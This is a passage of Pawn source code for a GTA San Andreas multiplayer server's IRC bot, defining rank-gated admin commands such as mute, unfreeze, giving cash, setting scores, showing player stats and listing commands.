        if(!IRC_IsOwner(botid, channel, user)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Invalid Level.");
        new regstr[50];
        format(regstr, sizeof(regstr), "ns register %s %s", IRC_BOT_PASSWORD, BOT_EMAIL);
        IRC_SendRaw(botid, regstr);
        return 1;
}
IRCCMD:bjoin(botid, channel[], user[], host[], params[])
{
        if(!IRC_IsOwner(botid, channel, user)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Invalid Level.");
        new regstr[50];
        format(regstr, sizeof(regstr), "join #xpadmins");
        IRC_SendRaw(gGroupID, regstr);
        return 1;
}
IRCCMD:bjoin1(botid, channel[], user[], host[], params[])
{
        if(!IRC_IsOwner(botid, channel, user)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Invalid Level.");
        new regstr[50];
        format(regstr, sizeof(regstr), "join #xptest");
        IRC_SendRaw(gGroupID, regstr);
        return 1;
}
IRCCMD:bleave(botid, channel[], user[], host[], params[])
{
        if(!IRC_IsOwner(botid, channel, user)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Invalid Level.");
        new regstr[50];
        format(regstr, sizeof(regstr), "part #xpadmins");
        IRC_SendRaw(gGroupID, regstr);
        return 1;
}
IRCCMD:ruc(botid, channel[], user[], host[], params[])
{
        if(IRC_IsAdmin(botid, channel, user))
        {
				new string[128];
				format(string,sizeof(string),"Administrator %s has respawn only unused vehicles.",user);
                SendClientMessageToAll(blue,string);
                format(string,sizeof(string),"10,11Administrator %s has respawn only unused vehicles.",user);
                IRC_GroupSay(gGroupID, IRC_CHANNEL,string);
    			forveh(i)
				{
			    	if(IsVehicleOccupied(i) == 0)
			    	{
			        	SetVehicleToRespawn(i);
			    	}
				}
		}
	  else return  IRC_GroupSay(gGroupID, IRC_CHANNEL,"10,11[LEVEL-INFO]:Invalid command! use !cmds to check full list.");
	return 1;
}
IRCCMD:admins(botid, channel[], user[], host[], params[])
{
    #pragma unused params
    new
        count = 0,
        string[800],
        AdmRank[500];

    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if (IsPlayerConnected(i))
        {
            if(PlayerInfo[i][Level] >= 1)
            {
                if(IsPlayerAdmin(i)) AdmRank ="[RCON ADMIN!]";
                else
                {
                    switch(PlayerInfo[i][Level])
                    {
                        case 1: AdmRank = " 12[Moderator]";
                        case 2: AdmRank = " 12[Junior Admin]";
                        case 3: AdmRank = " 12[Senior Admin]";
                        case 4: AdmRank = " 12[Lead Admin]";
                        case 5: AdmRank = " 12[Head Admin]";
                        case 6: AdmRank = " 12[Server Manager]";
                        case 7: AdmRank = " 12[Global Admin]";
                        case 8: AdmRank = " 12[Community Manager]";
                        case 9: AdmRank = " 12[Community Co-Owner]";
                        case 10: AdmRank = " 12[Community Owner]";
                    }


                    new nameee[128];
                    GetPlayerName(i, nameee, 16);
                    if(!strcmp(nameee, "JRockie", true))
                    GetPlayerName(i, nameee, 16);
                    if(!strcmp(nameee, "Admin", true))
                    GetPlayerName(i, nameee, 16);
                    if(!strcmp(nameee, "Perfect_Boy", true))
                    {
                      AdmRank = " 4[Community Owner And Scripter]";
                    }
                }
                format(string, 500, "12%s %s [ID:%i] | Level: %d - %s\n\n", string, PlayerName2(i), i, PlayerInfo[i][Level], AdmRank);
                //We are appending the string, so put %s before any new data is added,
                //and that parameter actually refers to the string itself.
                count++;
            }
        }
    }
    if (count == 0)
	IRC_GroupSay(gGroupID, IRC_CHANNEL,"4No admins online!");
    else IRC_GroupSay(gGroupID, IRC_CHANNEL,string);

    //Don't show dialog in a loop, it won't show all the admins continuously.
    //Show it after all the data are ready.
    return 1;
    }

IRCCMD:giveallcash(botid, channel[], user[], host[], params[])
{
        if(IRC_IsAdmin(botid, channel, user))
        {
	    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11JikyBot: Usage:!giveallcash [Amount]");
		new var = strval(params), string[128];
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
				GivePlayerMoney(i,var);
			}
		}
		format(string,sizeof(string),"Administrator \"%s\" has given all players '$%d'", user, var );
	    SendClientMessageToAll(C_PINK, string);
	    format(string,sizeof(string),"10,11Administrator \"%s\" has given all players '$%d'", user, var );
	    IRC_GroupSay(gGroupID, IRC_CHANNEL,string);

	} else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"10,4[LEVEL-INFO]:Invalid command! use !cmds to check full list.");
  return 0;
}

IRCCMD:unfreeze(botid, channel[], user[], host[], params[])
{
        if(IRC_IsOp(botid, channel, user))
        {
		    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11JikyBot: Usage:!unfreeze [playerid]");
	    	new player1, string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		 	    if(PlayerInfo[player1][Frozen] == 1) {
					UnFreezeMe(player1);
                	format(string,sizeof(string),"Administrator %s has unfrozen you", user ); SendClientMessage(player1,blue,string);
                    format(string,sizeof(string),"Administrator %s has unfrozen %s", user, PlayerName2(player1));
                    IRC_GroupSay(gGroupID, IRC_CHANNEL,string);
					format(string,sizeof(string),"Administrator %s has unfrozen %s", user, PlayerName2(player1));
		    	    SendClientMessageToAll(blue,string);
				} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11Player is not frozen");
			} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11Player is not connected or is the highest level admin");
		} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
return 1;
}
IRCCMD:async(botid, channel[], user[], host[], params[])
{
        if(IRC_IsOp(botid, channel, user))
        {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if (isnull(tmp)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11JikyBot: Usage:/async [playerid]");
		new player1 = strval(tmp);
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
        if(!IsPlayerInAnyVehicle(player1))
		 	{
        Synching[player1] = true;
        AntiSK[player1] = 0;
        GetPlayerHealth(player1,sHP[player1]);
        GetPlayerArmour(player1,sAP[player1]);
        GetPlayerPos(player1,sPos[player1][0],sPos[player1][1],sPos[player1][2]);
        for(new slot; slot < 13; slot++)
        {
        GetPlayerWeaponData(player1,slot,sWeap[player1][slot],sAmmo[player1][slot]);
        }
        SpawnPlayer(player1);
        AntiSK[player1] = 0;
        new string[128];
        format(string, sizeof(string), "IRC Admin %s has synced you.",user); SendClientMessage(player1,blue,string);
        format(string, sizeof(string), "10,11IRC Admin %s has synced  %s.",user,tmp);  IRC_GroupSay(gGroupID, IRC_CHANNEL,string);
        UpdateLabelText(player1);
         UpdateTextdraw(player1);
			} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11JikyBot: You cannot sync players in vehicles.");
	    } else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11JikyBot: Player is not connected");
	} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11[LEVEL-INFO]:Invalid command! use !cmds to check full list.");
	return 1;
}
IRCCMD:astats(botid, channel[], user[], host[], params[])
{
        if(IRC_IsOp(botid, channel, user))
        {
	    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11JikyBot: Usage:!aststs [playerid]");
	    new player1, string[128];
	    player1 = strval(params);


	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		    new Float:player1health, Float:player1armour, playerip[128], Float:x, Float:y, Float:z, tmp2[256], file[256],
				year, month, day, P1Jailed[4], P1Frozen[4], P1Logged[4], P1Register[4], RegDate[256], TimesOn;

			GetPlayerHealth(player1,player1health);
			GetPlayerArmour(player1,player1armour);
	    	GetPlayerIp(player1, playerip, sizeof(playerip));
	    	GetPlayerPos(player1,x,y,z);
			getdate(year, month, day);
			format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(player1)));

			if(PlayerInfo[player1][Jailed] == 1) P1Jailed = "Yes"; else P1Jailed = "No";
			if(PlayerInfo[player1][Frozen] == 1) P1Frozen = "Yes"; else P1Frozen = "No";
			if(Logged[player1] == 1) P1Logged = "Yes"; else P1Logged = "No";
			if(fexist(file)) P1Register = "Yes"; else P1Register = "No";
			if(dUserINT(PlayerName2(player1)).("LastOn")==0) tmp2 = "Never"; else tmp2 = dini_Get(file,"LastOn");
			if(strlen(dini_Get(file,"RegisteredDate")) < 3) RegDate = "n/a"; else RegDate = dini_Get(file,"RegisteredDate");
			TimesOn = dUserINT(PlayerName2(player1)).("TimesOnServer");

	  		format(string, sizeof(string),"(Player Info)  ---====> Name: %s  ID: %d <====---", PlayerName2(player1), player1);
			IRC_Say(botid, IRC_CHANNEL,string);
		  	format(string, sizeof(string),"Health: %d  Armour: %d  Score: %d  Cash: %d  Skin: %d  IP: %s Ping: %d",floatround(player1health),floatround(player1armour),
			GetPlayerScore(player1),GetPlayerMoney(player1),GetPlayerSkin(player1),playerip,GetPlayerPing(player1));
			IRC_Say(botid, IRC_CHANNEL,string);
			format(string, sizeof(string),"Interior: %d  Virtual World: %d  Wanted Level: %d  X %0.1f  Y %0.1f  Z %0.1f", GetPlayerInterior(player1), GetPlayerVirtualWorld(player1), GetPlayerWantedLevel(player1), Float:x,Float:y,Float:z);
		    IRC_Say(botid, IRC_CHANNEL,string);
			format(string, sizeof(string),"Times On Server: %d  Kills: %d  Deaths: %d  Ratio: %0.2f  AdminLevel: %d", TimesOn, PlayerInfo[player1][Kills], PlayerInfo[player1][Deaths], Float:PlayerInfo[player1][Kills]/Float:PlayerInfo[player1][Deaths], PlayerInfo[player1][Level] );
			IRC_Say(botid, IRC_CHANNEL,string);
			format(string, sizeof(string),"Registered: %s  Logged In: %s  In Jail: %s  Frozen: %s", P1Register, P1Logged, P1Jailed, P1Frozen );
			IRC_Say(botid, IRC_CHANNEL,string);
			format(string, sizeof(string),"Last On Server: %s  Register Date: %s  Todays Date: %d/%d/%d", tmp2, RegDate, day,month,year );
			IRC_Say(botid, IRC_CHANNEL,string);



			new slot, ammo, weap, cnt, WeapName[24], WeapSTR[128], p; WeapSTR = "Weaps: ";
			for (slot = 0; slot < 14; slot++) {	GetPlayerWeaponData(player1, slot, weap, ammo); if( ammo != 0 && weap != 0) cnt++; }
			if(cnt < 1) return IRC_GroupSay(gGroupID, IRC_CHANNEL,"4Player has no weapons");
			else {
				for (slot = 0; slot < 14; slot++)
				{
					GetPlayerWeaponData(player1, slot, weap, ammo);
					if (ammo > 0 && weap > 0)
					{
						GetWeaponName(weap, WeapName, sizeof(WeapName) );
						if (ammo == 65535 || ammo == 1) format(WeapSTR,sizeof(WeapSTR),"%s%s (1)",WeapSTR, WeapName);
						else format(WeapSTR,sizeof(WeapSTR),"%s%s (%d)",WeapSTR, WeapName, ammo);
						p++;
						if(p >= 5) { IRC_GroupSay(gGroupID, IRC_CHANNEL, WeapSTR); format(WeapSTR, sizeof(WeapSTR), "Weaps: "); p = 0;
						} else format(WeapSTR, sizeof(WeapSTR), "%s,  ", WeapSTR);
					}
				}
				if(p <= 4 && p > 0) {
					string[strlen(string)-3] = '.';
				    IRC_GroupSay(gGroupID, IRC_CHANNEL, WeapSTR);
				}
			}
			return 1;
		} else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"JikyBot: Player is not connected");
	} else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"JikyBot: You need to be administrator level 2 to use this command");
}
IRCCMD:stats(botid, channel[], user[], host[], params[])
{


	new str[956], pDeaths, player1, h, m, s,playername[MAX_PLAYER_NAME];
	  player1 = strval(params);
    if(IsPlayerConnected(player1)) {
        TotalGameTime(player1, h, m, s);
        GetPlayerName(player1, playername, sizeof(playername));
 	    if(PlayerInfo[player1][Deaths] == 0) pDeaths = 1; else pDeaths = PlayerInfo[player1][Deaths];
	    format(str, sizeof str, "4Name: 13%s || 4 Scores: 13%d || 4Money: 13$%d || 4 Kills: 13%d || 4Deaths: 13%d || 4K/D Ratio: 13%0.2f ||",  PlayerName2(player1), GetPlayerScore(player1), GetPlayerMoney(player1), PlayerInfo[player1][Kills], PlayerInfo[player1][Deaths], Float:PlayerInfo[player1][Kills]/Float:pDeaths);
        IRC_Say(botid, IRC_CHANNEL, str);
        format(str, sizeof str, "4Admin Level: 13%d || 4Operator: 13%s || 4Team: 13%s || 4Class: 13%s ||", PlayerInfo[player1][Level], PlayerInfo[player1][Helper] ? ("Yes") : ("No"), GetTeamName(player1), GetClass(player1));
     IRC_Say(botid, IRC_CHANNEL, str);
	    format(str, sizeof str, "4TimePlayed: 13[%d] hrs [%d] mins [%d] secs", h, m, s);
    IRC_Say(botid, IRC_CHANNEL, str);

    } else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"Player Is Not Connected!");
 return 1;
}
IRCCMD:healall(botid, channel[], user[], host[], params[])
{

    #pragma unused params
	if(IRC_IsOp(botid, channel, user))
        {
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerHealth(i,100.0);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has healed all players", user );
	    SendClientMessageToAll(C_PINK, string);
	    format(string,sizeof(string),"10,11Administrator \"%s\" has healed all players", user );
	    IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
	} else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"JikyBot: Invalid CMD, check !cmds.");
return 1;
}

IRCCMD:armourall(botid, channel[], user[], host[], params[]) {
    #pragma unused params
	if(IRC_IsOwner(botid, channel, user))
	{

	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerArmour(i,100.0);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has restored all players armour",user );
	    SendClientMessageToAll(C_PINK, string);
	    format(string,sizeof(string),"10,11Administrator \"%s\" has restored all players armour",user );
	    IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
	} else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"JikyBot: Invalid CMD, check !cmds.");
return 1;
}
IRCCMD:mute(botid, channel[], user[], host[], params[]) {
	if(IRC_IsHalfop(botid, channel, user))
	{
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11JikyBot: Usage:/mute [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Muted] == 0) {
					GetPlayerName(player1, playername, sizeof(playername));

					PlayerPlaySound(player1,1057,0.0,0.0,0.0);  PlayerInfo[player1][Muted] = 1; PlayerInfo[player1][MuteWarnings] = 0;

					if(strlen(tmp2)) {
						format(string,sizeof(string),"You have been muted by Administrator %s [reason: %s]",user,params[2]); SendClientMessage(player1,blue,string);
						format(string,sizeof(string),"Administrator %s Muted %s[reason: %s]",user,playername,params[2]); SendClientMessageToAll(blue,string);
						format(string,sizeof(string),"You have muted %s [reason: %s]", playername,params[2]); return IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
					} else {
						format(string,sizeof(string),"You have been muted by Administrator %s",user); SendClientMessage(player1,blue,string);
						 }
				} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11Player is already muted");
			} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11Player is not connected or is the highest level admin");
		} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11[LEVEL-INFO]:Invalid command! use !cmds to check full list.");
return 1;
}

IRCCMD:unmute(botid, channel[], user[], host[], params[]) {
	if(IRC_IsHalfop(botid, channel, user))
	{
		    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL,"JikyBot: Usage:/unmute [playerid]");
	    	new player1, playername[MAX_PLAYER_NAME], string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Muted] == 1) {
					GetPlayerName(player1, playername, sizeof(playername));
					PlayerPlaySound(player1,1057,0.0,0.0,0.0);  PlayerInfo[player1][Muted] = 0; PlayerInfo[player1][MuteWarnings] = 0;
					format(string,sizeof(string),"You have been unmuted by Administrator %s",user); SendClientMessage(player1,blue,string);

					format(string,sizeof(string),"Administrator %s has unmuted %s from IRC.",user, playername);
					 SendClientMessageToAll(blue,string);
					 IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
				} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11Player is not muted");
			} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11Player is not connected or is the highest level admin");
		} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "10,11[LEVEL-INFO]:Invalid command! use !cmds to check full list.");
return 1;
}
IRCCMD:cc(botid, channel[], user[], host[], params[]) {
	if(IRC_IsHalfop(botid, channel, user))
	{
    #pragma unused params

		for(new i = 0; i < 11; i++) SendClientMessageToAll(green," ");
		SendClientMessageToAll(blue,"Chat Has been cleared by admins!!");
         IRC_Say(botid, IRC_CHANNEL,"Chat Has been cleared by admins!!");
		 return 1;
 	} else return  IRC_Say(botid, IRC_CHANNEL,"ERROR: You need to be level 2 to use this command");
}
IRCCMD:resetlicense(botid, channel[], user[], host[], params[]) {
	if(IRC_IsOp(botid, channel, user))
	{
	new targetid;
	if(sscanf(params, "u", targetid)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Correct JikyBot: Usage:!givelicense [playerid]");

	    new tname[MAX_PLAYER_NAME], string[128];
	    GetPlayerName(targetid, tname, sizeof(tname));
	    format(string, sizeof(string), "Admin %s has restored %s's license.", user, tname);
	    SendClientMessageToAll(COLOR_PINK, string);
	    IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
		if(License[targetid] == 0)
       IRC_GroupSay(gGroupID, IRC_CHANNEL, "JikyBot: Player dosent have a License");
		if(License[targetid] == 1)
		IRC_GroupSay(gGroupID, IRC_CHANNEL, "JikyBot: Player already Has a License");
		if(License[targetid] == 2)
		License[targetid] = 1;

}
return 0;
}
IRCCMD:revokelicense(botid, channel[], user[], host[], params[]) {
	if(IRC_IsOp(botid, channel, user))
	{
	new targetid;
	if(sscanf(params, "u", targetid)) return  IRC_GroupSay(gGroupID, IRC_CHANNEL, "Correct JikyBot: Usage:!revokelicense [playerid]");

	    new tname[MAX_PLAYER_NAME], string[128];
	    GetPlayerName(targetid, tname, sizeof(tname));
	    format(string, sizeof(string), "Server admin %s has revoked %s's license. [Reason: Base Rape]", user, tname);
	    SendClientMessageToAll(COLOR_PINK, string);
	     IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
		if(License[targetid] == 0)
         IRC_GroupSay(gGroupID, IRC_CHANNEL, "JikyBot: Player dosent have a License");
		if(License[targetid] == 2)
		 IRC_GroupSay(gGroupID, IRC_CHANNEL, "JikyBot: Player has Got his License Revoked Use /reseticense");
		if(License[targetid] == 1)
		License[targetid] = 2;
	}
	else return  IRC_GroupSay(gGroupID, IRC_CHANNEL, "You cannot use this!.");
	return 1;
}


IRCCMD:richlist(botid, channel[], user[], host[], params[]) {
    #pragma unused params
 		new string[128], Slot1 = -1, Slot2 = -1, Slot3 = -1, Slot4 = -1, HighestCash = -9999;
 			IRC_Say(botid, IRC_CHANNEL, "10,11Rich List:");

		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x)) if (GetPlayerMoney(x) >= HighestCash) {
			HighestCash = GetPlayerMoney(x);
			Slot1 = x;
		}
		HighestCash = -9999;
		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x) && x != Slot1) if (GetPlayerMoney(x) >= HighestCash) {
			HighestCash = GetPlayerMoney(x);
			Slot2 = x;
		}
		HighestCash = -9999;
		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x) && x != Slot1 && x != Slot2) if (GetPlayerMoney(x) >= HighestCash) {
			HighestCash = GetPlayerMoney(x);
			Slot3 = x;
		}
		HighestCash = -9999;
		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x) && x != Slot1 && x != Slot2 && x != Slot3) if (GetPlayerMoney(x) >= HighestCash) {
			HighestCash = GetPlayerMoney(x);
			Slot4 = x;
		}
		    format(string, sizeof(string), "2(%d) %s - $%d - %d", Slot1,PlayerName2(Slot1),GetPlayerMoney(Slot1),GetPlayerScore(Slot1) );
		    IRC_Say(botid, IRC_CHANNEL,string);
		if(Slot2 != -1)	{
			format(string, sizeof(string), "2(%d) %s - $%d - %d", Slot2,PlayerName2(Slot2),GetPlayerMoney(Slot2),GetPlayerScore(Slot2) );
			IRC_Say(botid, IRC_CHANNEL,string);
		}
		if(Slot3 != -1)	{
			format(string, sizeof(string), "2(%d) %s - $%d - %d", Slot3,PlayerName2(Slot3),GetPlayerMoney(Slot3),GetPlayerScore(Slot3) );
			IRC_Say(botid, IRC_CHANNEL,string);
		}
		if(Slot4 != -1)	{
			format(string, sizeof(string), "2(%d) %s - $%d - %d", Slot4,PlayerName2(Slot4),GetPlayerMoney(Slot4),GetPlayerScore(Slot4) );
			IRC_Say(botid, IRC_CHANNEL,string);
		}
		return 1;
}
IRCCMD:setcash(botid, channel[], user[], host[], params[]) {
	if(IRC_IsOp(botid, channel, user))
	{
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return IRC_Say(botid, IRC_CHANNEL, "JikyBot: Usage:/setcash [playerid] [amount]");
		new player1 = strval(tmp), cash = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel]) return IRC_Say(botid, IRC_CHANNEL,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			format(string,sizeof(string),"Administrator \"%s\" has set your cash to '$%d'", user, cash); SendClientMessage(player1,blue,string);
		  format(string,sizeof(string),"7Administrator \"%s\" has set %s's cash to '%d'",user, pName(player1), cash); IRC_GroupSay(gGroupID, IRC_CHANNEL, string);  SendClientMessageToAll(blue,string);
			ResetPlayerMoney(player1);
			SaveToFile("Admin",string);
   			return GivePlayerMoney(player1, cash);
	    } else return IRC_Say(botid, IRC_CHANNEL,"JikyBot: Player is not connected");
	} else return IRC_Say(botid, IRC_CHANNEL,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
IRCCMD:cmds(botid, channel[], user[], host[], params[])
{
	#pragma unused params
	if(IRC_IsOwner(botid, channel, user))
	{
        IRC_Say(botid, IRC_CHANNEL,"4IRC Commands(at owner level). ");
	    IRC_Say(botid, IRC_CHANNEL,"12!bregister !say !cc !setlevel !pm  !players  !warn !giveallcash !mute  !unmute  !admin  !jail  !unfreeze !bleave !spawn");
	    IRC_Say(botid, IRC_CHANNEL,"12!bjoin !kick !setofflevel !aka !weaps !unban !armourall !slap !givecash  !setscore !unjail !spam !caps !setkills !setdeaths");
	    IRC_Say(botid, IRC_CHANNEL,"12!bjoin1 !info !ban !ruc !adan !akill !rcon !admin !healall !lastseen  !ad !checkacc !getid !sban !freeze !gas !saveallstats");
        IRC_Say(botid, IRC_CHANNEL,"12!setoffcash !setoffkills !setoffdeaths !setofflevel !setoffdonor !setoffscore  !setoffname.");
		return 1;
	}
	if(IRC_IsAdmin(botid, channel, user))
	{
        IRC_Say(botid, IRC_CHANNEL,"4IRC Commands(). ");
        IRC_Say(botid, IRC_CHANNEL,"12!say  !pm !cc !players  !warn !giveallcsah !mute  !unmute  !admin  !jail !ruc  !unfreeze  !spawn");
	    IRC_Say(botid, IRC_CHANNEL,"12!kick !aka !weaps !unban  !slap !givecash !admins !setscore !unjail  !spam !caps !setkills !setdeaths");
	   IRC_Say(botid, IRC_CHANNEL,"12!info !ban  !akill !adan !healall !armnourall !lastseen !ad !checkacc !getid !sban !freeze !gas !saveallstats");
        IRC_Say(botid, IRC_CHANNEL,"12!setoffcash !setoffkills !setoffdeaths !setoffscore !setoffname.");
	    return 1;
	}
	if(IRC_IsOp(botid, channel, user))
	{
        IRC_Say(botid, IRC_CHANNEL,"4IRC Commands(). ");
	    IRC_Say(botid, IRC_CHANNEL,"12!say !cc !trash !pm  !players  !warn !mute  !unmute  !admin !freeze ");
	    IRC_Say(botid, IRC_CHANNEL,"12!kick !aka !weaps  !slap  !admins  !unjail  !spam !jail !unfreeze !caps ");
	    IRC_Say(botid, IRC_CHANNEL,"12!info !ban  !akill !adan !lastseen !ad !checkacc !getid !sban !spawn  ");
        IRC_Say(botid, IRC_CHANNEL,"12!setoffcash !setoffkills !setoffdeaths !setoffscore.");
	    return 1;
	}
	if(IRC_IsHalfop(botid, channel, user))
	{
        IRC_Say(botid, IRC_CHANNEL,"4IRC Commands(). ");
	    IRC_Say(botid, IRC_CHANNEL,"12!say !cc !trash !pm  !players  !warn !mute  !unmute  !admin  ");
	    IRC_Say(botid, IRC_CHANNEL,"12!kick !aka !weaps  !slap  !admins  !unjail  !spam !jail  !caps ");
	    IRC_Say(botid, IRC_CHANNEL,"12!info !lastseen !ad !checkacc !getid !sban !spawn  ");
	    return 1;
	}
	if(IRC_IsVoice(botid,channel,user))
	{
       IRC_GroupSay(gGroupID, IRC_CHANNEL,"12!say !pm  !players  !admins !getid  !info !stats");
 	return 1;
 	}

    else
    {
	    IRC_GroupSay(gGroupID, IRC_CHANNEL,"12IRC Commands");
	    IRC_GroupSay(gGroupID, IRC_CHANNEL,"12!say !pm  !players  !admins !getid  !info");
	}

	return 1;
}

IRCCMD:slap(botid, channel[], user[], host[], params[])
{
    new id, str[128], str2[128], pname[MAX_PLAYER_NAME], Float:x, Float:y, Float:z;
    if(!IRC_IsHalfop(botid, channel, user)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Invalid Level");
        {
        if(sscanf(params, "us[128]", id, str))
        {
                        IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10Usage: !slap [ID] [reason]");
                        return 1;
                }
         GetPlayerName(id, pname, sizeof(pname));
         format(str2, sizeof(str2), "53SLAP:1 %s Has Been Slapped By 39IRC Administrator1 %s - 4Reason:1 %s", pname, user, str);
         SendClientMessageToAll(COLOR_LIGHTBLUE, str2);
         format(str2, sizeof(str2), "53SLAP:1 %s Has Been Slapped By 39IRC Administrator1 %s - 4Reason:1 %s", pname, user, str);
                IRC_GroupSay(gGroupID, IRC_CHANNEL, str2);
        GetPlayerPos(id, x, y, z);
        SetPlayerPos(id, x, y, z+10);
        }
        return 1;
}
IRCCMD:givecash(botid, channel[], user[], host[], params[])
{
    new id, amount, pname[MAX_PLAYER_NAME], Mstr[128];
    if(!IRC_IsAdmin(botid, channel, user)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Invalid Level");
        {
        if(sscanf(params,"ui", id, amount))
                {
                        IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10Usage: !givecash [ID] [Amount]");
                }
        if(!IsPlayerConnected(id)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Invalid Player ID.");
        {
        GetPlayerName(id, pname, sizeof(pname));
        GivePlayerMoney(id, amount);
        format(Mstr, sizeof(Mstr), "CASH::1 %s Has Been Given $%d By IRC Administrator %s", pname, amount, user);
        SendClientMessageToAll(COLOR_LIGHTBLUE, Mstr);
         format(Mstr, sizeof(Mstr), "4CASH::1 %s Has Been Given $%d By IRC Administrator %s", pname, amount, user);
               IRC_GroupSay(gGroupID, IRC_CHANNEL, Mstr);
        }
    }
    return 1;
}

IRCCMD:setscore(botid, channel[], user[], host[], params[])
{
        new id, score, pname[MAX_PLAYER_NAME], str[128];
        if(!IRC_IsAdmin(botid, channel, user)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Invalid Level");
        {
                if (sscanf(params, "ui", id, score))
                {
                        IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10Usage: !setscore [ID] [score]");
                }
                if(!IsPlayerConnected(id)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Invalid Player ID.");
                {
        SetPlayerScore(id, score);
        GetPlayerName(id, pname, sizeof(pname));
        format(str, sizeof(str), "SCORE::1 %s Score Has Been Set To %d By IRC Administrator %s", pname, score, user);
        SendClientMessageToAll(COLOR_LIGHTBLUE, str);
        format(str, sizeof(str), "5SCORE::1 %s Score Has Been Set To %d By IRC Administrator %s", pname, score, user);
                IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
                }
        }
        return 1;
}
IRCCMD:spam(botid, channel[], user[], host[], params[])
{
		// Check if the user entered any text
			// Echo the formatted message
			if (IRC_IsHalfop(botid, channel, user))
			{
			new msg[112];
		 	format(msg,sizeof(msg), "[PBOT] Please do not Flood or Spam in chat, or else you will be muted!", user, params);
			SendClientMessageToAll(COLOR_LIGHTBLUE, msg);
			format(msg, sizeof(msg),"2[PBOT] Please do not Flood or Spam in chat, or else you will be muted!", user, params);
			IRC_GroupSay(gGroupID, IRC_CHANNEL, msg);
			return 1;
			}
			return 1;
}

IRCCMD:caps(botid, channel[], user[], host[], params[])
{
		// Check if the user entered any text
			// Echo the formatted message
			if (IRC_IsHalfop(botid, channel, user))
			{
			new msg[112];
		 	format(msg,sizeof(msg), "[PBOT] Please turn off your caps, or else you will be muted!", user, params);
